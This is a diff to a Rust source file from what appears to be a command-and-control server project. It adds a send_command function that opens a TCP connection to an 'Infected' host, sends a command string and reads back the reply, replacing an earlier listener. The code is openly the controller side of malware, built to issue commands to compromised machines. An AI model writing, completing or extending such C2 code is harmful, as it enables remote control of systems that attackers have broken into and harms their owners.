@@ -1,7 +1,8 @@
 use std::{net::IpAddr, path::PathBuf};
 use thiserror::Error;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
-use crate::domains::{command::C2Command, infected::Infected};
+use crate::{domains::{command::C4Command, infected::{self, Infected}}, repos};
 
 #[derive(Debug, Clone, Default, Copy)]
 pub enum C4ServerConnectionStatus {
@@ -13,6 +14,20 @@ pub enum C4ServerConnectionStatus {
 #[derive(Error, Debug)]
 #[error("Connection to C4 Server failed")]
 pub struct C4ConnectionError;
+
+#[derive(Error, Debug)]
+#[error("Connection to target failed")]
+pub enum C4TargetError {
+    #[error("Target does not exist")]
+    TargetDoesNotExist,
+    
+    #[error(transparent)]
+    Other(std::io::Error)
+}
+
+pub enum C4ConnectionResponse {
+    Ok(String)
+}
 
 pub struct C4Server {
     ip: IpAddr, // kan nok udsiftes med en socketaddr
@@ -29,21 +44,26 @@ impl C4Server {
         }
     }
 
-    pub async fn start_listener(&mut self) -> Result<(), C4ConnectionError> {
-        let addr = format!("{}:{}", self.ip, self.port).to_string();
+    pub async fn send_command(&mut self, target: &Infected, command: C4Command) -> Result<C4ConnectionResponse, C4TargetError> {
+        let target_addr = format!("{}:{}", target.ip(), target.port().to_string());
 
-        let listener = match tokio::net::TcpListener::bind(addr).await {
-            Ok(l) => {
-                self.status = C4ServerConnectionStatus::Open;
-                l
-            }, 
-            Err(err) => {
-                self.status = C4ServerConnectionStatus::Closed;
-                return Err(C4ConnectionError)
-            }
+        let mut stream = match tokio::net::TcpStream::connect(target_addr).await {
+            Ok(s) => s,
+            Err(err) => return Err(C4TargetError::Other(err))
+        };
+
+        if let Err(err) = stream.write_all(command.get_as_str().as_bytes()).await {
+            return Err(C4TargetError::Other(err));
         };
         
-        Ok(())
+        let mut buffer = vec![0; 1024];
+        let n = match stream.read(&mut buffer).await {
+            Ok(n) => n,
+            Err(err) => return Err(C4TargetError::Other(err))
+        };
+    
+        let response = String::from_utf8_lossy(&buffer[..n]).to_string();
+        Ok(C4ConnectionResponse::Ok(response))
     }
 
     pub fn get_ip(&self) -> String {
